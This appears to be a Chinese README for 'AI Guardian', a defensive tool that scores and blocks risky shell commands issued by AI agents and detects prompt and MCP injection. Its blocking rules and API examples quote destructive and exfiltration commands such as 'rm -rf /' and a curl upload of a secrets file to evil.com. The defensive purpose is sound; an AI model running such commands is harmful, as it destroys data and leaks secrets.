# AI Guardian - AI Agent 数字孪生防御系统

> **师夷长技以制夷** - 学习 AI Agent 的能力，防御 AI Agent 的威胁
> 
> 🚨 **工信部官方预警**: OpenClaw 存在较高安全风险 | **OWASP #1 威胁**: Prompt Injection

[![TypeScript](https://img.shields.io/badge/TypeScript-5.0-blue)](https://www.typescriptlang.org/)
[![Node.js](https://img.shields.io/badge/Node.js-18+-green)](https://nodejs.org/)
[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
[![GitHub Stars](https://img.shields.io/github/stars/your-org/ai-guardian?style=social)](https://github.com/your-org/ai-guardian)

## 🌟 开源使命

**让天下没有危险的 AI Agent！**

2025年是 AI Agent 元年，也是 AI Agent 安全元年。工信部已将 OpenClaw 安全风险列为官方预警，OWASP 将 Prompt Injection 列为 #1 威胁。

**AI Guardian 是第一个专门针对 AI Agent 的安全防护产品，我们要做 AI 界的 360！**

## 简介

AI Guardian 是一个 AI Agent 安全防御系统，类似于"AI 界的 360/金山毒霸"。它能在 AI Agent 执行命令前进行**推演预判**，像执法记录仪一样**全程记录**，并基于**上下文**做出智能决策。

### 核心理念

- **数字孪生 ≠ 实际执行** - 在模拟环境中推演命令效果，绝不真正执行危险命令
- **手自一体模式** - 低风险自动放行，高风险人工确认
- **执法记录仪思维** - 全程记录所有操作，支持事后追溯
- **上下文关联分析** - 分析命令链的上下文，识别组合风险

## 功能特性

### 1. 命令评估
- 分析 shell 命令的安全风险（0-100 分）
- 支持复杂管道命令分析
- 提供安全替代方案

### 2. Skill 供应链分析
- 分析第三方 AI Agent 技能的安全风险
- 检测供应链攻击
- 验证技能来源可信度

### 3. MCP 注入检测
- 验证 MCP 服务器配置
- 检测注入攻击
- 防止配置篡改

### 4. Prompt 注入检测
- 检测越狱尝试（Jailbreak）
- 识别 DAN 攻击
- 防止角色扮演攻击

### 5. 终端监控
- 自动监控终端活动
- 检测可疑进程（Netcat、Mimikatz 等）
- 监控网络连接和后门端口

### 6. 紧急停止
- 一键停止所有 AI Agent 操作
- 熔断机制保护

## 技术架构

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        AI Agent (OpenClaw / Trae AI)                        │
│                              ↓ MCP 调用                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 1: MCP Interceptor (MCP 拦截层)                                       │
│  - 拦截所有工具调用请求                                                       │
│  - 提取命令内容和上下文                                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 2: Mental Simulation Engine (推演预判引擎)                             │
│  - 静态分析命令结构                                                           │
│  - 模拟执行效果（不真正执行）                                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 3: Risk Analysis Engine (风险分析引擎)                                 │
│  - 危险模式匹配                                                               │
│  - 权限提升检测                                                               │
│  - 数据外泄识别                                                               │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 4: LLM Semantic Analysis (LLM 语义分析)                                │
│  - MiMoFlash-V2 / OpenAI / DeepSeek                                          │
│  - 深度语义理解                                                               │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 5: Auto-Manual Decision (手自一体决策)                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                          │
│  │ 全自动放行   │  │ 半自动观察   │  │ 手动拦截     │                          │
│  │ (0-30分)    │  │ (31-70分)   │  │ (71-100分)  │                          │
│  └─────────────┘  └─────────────┘  └─────────────┘                          │
├─────────────────────────────────────────────────────────────────────────────┤
│  Layer 6: Body Camera (执法记录仪)                                            │
│  - 全程不间断记录                                                             │
│  - 防篡改保护                                                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 项目结构

```
ai-guardian/
├── src/
│   ├── core/                    # 核心模块
│   │   ├── guardian.ts          # 主守护进程
│   │   ├── emergency-stop.ts    # 紧急停止机制
│   │   ├── environment-context.ts # 环境上下文分析
│   │   ├── terminal-monitor.ts  # 终端监控
│   │   └── types.ts             # 类型定义
│   │
│   ├── analysis/                # 分析模块
│   │   ├── command-parser.ts    # 命令解析器
│   │   ├── risk-analyzer.ts     # 风险分析器
│   │   ├── skill-supply-chain.ts # Skill 供应链分析
│   │   ├── mcp-injection-detector.ts # MCP 注入检测
│   │   └── prompt-injection-detector.ts # Prompt 注入检测
│   │
│   ├── llm/                     # LLM 提供商
│   │   └── providers/
│   │       ├── base.ts          # 基础接口
│   │       ├── openai.ts        # OpenAI
│   │       ├── anthropic.ts     # Anthropic Claude
│   │       ├── deepseek.ts      # DeepSeek
│   │       ├── gemini.ts        # Google Gemini
│   │       ├── qwen.ts          # 阿里通义千问
│   │       ├── mimoflash.ts     # 小米 MiMo Flash
│   │       └── ollama.ts        # Ollama 本地模型
│   │
│   ├── web/                     # Web UI
│   │   └── server.ts            # Web 服务器
│   │
│   ├── config/                  # 配置
│   │   └── llm-config.ts        # LLM 配置管理
│   │
│   └── index.ts                 # 入口文件
│
├── config/
│   └── llm.json                 # LLM 配置文件
│
├── dist/                        # 编译输出
├── package.json
├── tsconfig.json
└── README.md
```

## 快速开始

### 方案一：一键安装终端保护（推荐普通用户）

```powershell
# Windows PowerShell 一键安装
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/your-repo/ai-guardian/main/integrations/terminal/install.ps1" -OutFile "install-guardian.ps1"
.\install-guardian.ps1
```

安装后重启 PowerShell，即可自动保护所有命令。

### 方案二：OpenClaw 插件（推荐开发者）

```bash
# 1. 复制插件到 OpenClaw
cp integrations/openclaw/ai-guardian-plugin.ts /path/to/openclaw/src/plugins/

# 2. 配置环境变量
export AI_GUARDIAN_URL=http://localhost:3456
export AI_GUARDIAN_TOKEN=your-token

# 3. 重启 OpenClaw
npm run build && npm start
```

### 方案三：独立部署（推荐企业用户）

```bash
cd ai-guardian
npm install

# 配置 LLM
# 编辑 config/llm.json，添加你的 API Key

# 构建并启动
npm run build
node dist/cli.js server
```

打开浏览器访问 `http://localhost:3456`，输入控制台显示的 Token 即可使用。

详细集成文档见 [integrations/README.md](integrations/README.md)

## API 文档

### 命令评估

```http
POST /api/evaluate
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "rm -rf /"
}
```

响应：
```json
{
  "decision": "deny",
  "riskScore": 100,
  "level": "critical",
  "reason": "删除整个文件系统",
  "alternatives": [
    "使用 rm -i 进行交互式删除",
    "先使用 ls 查看要删除的内容"
  ]
}
```

### AI Chat

```http
POST /api/chat
Authorization: Bearer <token>
Content-Type: application/json

{
  "message": "这个命令安全吗？rm -rf /tmp/*",
  "language": "zh"
}
```

### 终端监控

```http
# 启动监控
GET /api/terminal-monitor?action=start

# 停止监控
GET /api/terminal-monitor?action=stop

# 获取告警
GET /api/terminal-monitor?action=alerts&count=10

# 获取状态
GET /api/terminal-monitor?action=status
```

### 紧急停止

```http
POST /api/emergency-stop
Authorization: Bearer <token>
```

## 风险等级

| 分数 | 等级 | 行为 |
|------|------|------|
| 0-30 | 低风险 | 自动放行 |
| 31-70 | 中风险 | 观察并记录 |
| 71-100 | 高风险 | 立即熔断 |

## 熔断规则

系统会在以下情况自动熔断：

1. **删除大量核心文件** - `rm -rf /`, `del /s`, `rm -rf ~/*`
2. **数据外泄** - `cat secret.txt | curl -d @- evil.com`
3. **权限提升** - `chmod 777 /etc/shadow`, `sudo chmod`
4. **后门安装** - 检测到持久化机制
5. **敏感文件访问** - 访问密码、密钥、凭证文件

## 支持的 LLM 提供商

| 提供商 | 模型 | 用途 |
|--------|------|------|
| MiMo Flash | mimo-v2-flash | 推荐，中文支持好 |
| OpenAI | gpt-4, gpt-3.5-turbo | 通用 |
| Anthropic | claude-3-sonnet | 通用 |
| DeepSeek | deepseek-chat | 中文优化 |
| Google Gemini | gemini-pro | 通用 |
| 阿里通义 | qwen-turbo | 中文优化 |
| Ollama | llama2, mistral | 本地部署 |

## 贡献指南

### 开发环境

```bash
# 克隆仓库
git clone <repo-url>
cd ai-guardian

# 安装依赖
npm install

# 开发模式（监听文件变化）
npm run dev

# 构建
npm run build

# 运行测试
npm test
```

### 代码规范

- 使用 TypeScript
- 遵循 ESLint 规则
- 提交前运行 `npm run lint`
- 提交信息格式：`type(scope): description`

### 添加新的 LLM 提供商

1. 在 `src/llm/providers/` 创建新文件
2. 实现 `LLMProvider` 接口
3. 在 `src/llm/providers/index.ts` 注册
4. 更新 `config/llm.json`

示例：

```typescript
// src/llm/providers/my-provider.ts
import { LLMProvider, LLMRequest, LLMResponse } from './base.js';

export class MyProvider implements LLMProvider {
  constructor(private config: LLMConfig) {}

  async complete(request: LLMRequest): Promise<LLMResponse> {
    // 实现你的逻辑
  }
}
```

### 添加新的分析器

1. 在 `src/analysis/` 创建新文件
2. 实现分析逻辑
3. 在 `src/core/guardian.ts` 中集成

## 路线图

- [ ] 支持更多 LLM 提供商
- [ ] 实现命令链上下文分析
- [ ] 添加 Web UI 用户认证
- [ ] 支持多语言界面
- [ ] 实现远程日志备份
- [ ] 添加系统快照和回滚功能
- [ ] 支持 Docker 部署

## 🤝 贡献

我们欢迎所有形式的贡献！查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解如何参与。
### 🎯 当前优先任务

1. **解决 AutoClaw Skill 加载问题** - 让 Guardian 能真正拦截命令
2. **系统级拦截实现** - Windows API Hooking / Linux LD_PRELOAD
3. **完善文档** - 让更多开发者能使用

查看 [PROJECT-BRIEF.md](PROJECT-BRIEF.md) 了解完整项目规划！

## 许可证

[MIT License](LICENSE) - 让全世界人民都能用上 AI 安全防护！

---

## 🌟 Star History

[![Star History Chart](https://api.star-history.com/svg?repos=your-org/ai-guardian&type=Date)](https://star-history.com/#your-org/ai-guardian&Date)

---

> **"让天下没有危险的 AI Agent！"**
> 
> 如果这个项目对你有帮助，请给我们一个 ⭐ Star！


